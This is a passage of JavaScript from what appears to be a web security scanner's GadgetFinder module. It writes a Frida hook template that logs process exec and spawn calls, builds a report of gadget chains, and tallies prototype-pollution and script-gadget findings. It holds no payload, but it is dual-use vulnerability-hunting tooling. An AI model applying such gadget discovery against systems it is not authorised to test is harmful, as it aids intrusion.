    send({ type: 'exec', cmd: String(cmd).substring(0, 300) });
    return origExec.apply(this, arguments);
  };
  const origSpawn = cp.spawn;
  cp.spawn = function(cmd, args) {
    console.log('[GENKI-FRIDA] spawn: ' + cmd + ' ' + JSON.stringify(args));
    send({ type: 'spawn', cmd, args: JSON.stringify(args).substring(0, 300) });
    return origSpawn.apply(this, arguments);
  };
} catch(e) {}

console.log('[GENKI-FRIDA] Hooks installed. Monitoring for gadgets...');
`;
    fs.writeFileSync(path.join(dir, 'genki-frida.js'), fridaTemplate);
    
    // Chain analysis summary
    if (this.gadgets.chain.length > 0) {
      let chainReport = '# GENKI Chain Analysis Report\n\n';
      const grouped = {};
      this.gadgets.chain.forEach(c => {
        if (!grouped[c.pattern]) grouped[c.pattern] = [];
        grouped[c.pattern].push(c);
      });
      for (const [pattern, items] of Object.entries(grouped)) {
        chainReport += `## ${pattern}\n`;
        chainReport += `${items[0].desc}\n`;
        chainReport += `Found in: ${items.map(i => i.file).join(', ')}\n`;
        if (items[0].samples) chainReport += `Samples:\n${items[0].samples.map(s => '  ' + s).join('\n')}\n`;
        chainReport += '\n';
      }
      fs.writeFileSync(path.join(dir, 'chain-analysis.md'), chainReport);
    }
  }

  summary() {
    return {
      libraries: Object.keys(this.detectedLibs).length,
      ppGadgets: this.gadgets.pp.length,
      scriptGadgets: this.gadgets.script.length,
      chainOpportunities: this.gadgets.chain.length,
      ssppProbes: this.gadgets.sspp.length,
      totalFindings: this.findings.length,
    };
  }

  // Called by orchestrator after security-scanner determines CSP defense level
  setCspDefenseLevel(level) { this.cspDefenseLevel = level || 'unknown'; }

  getFindings() { return this.findings; }
  getGadgets() { return this.gadgets; }
  getDetectedLibs() { return this.detectedLibs; }
}

module.exports = GadgetFinder;
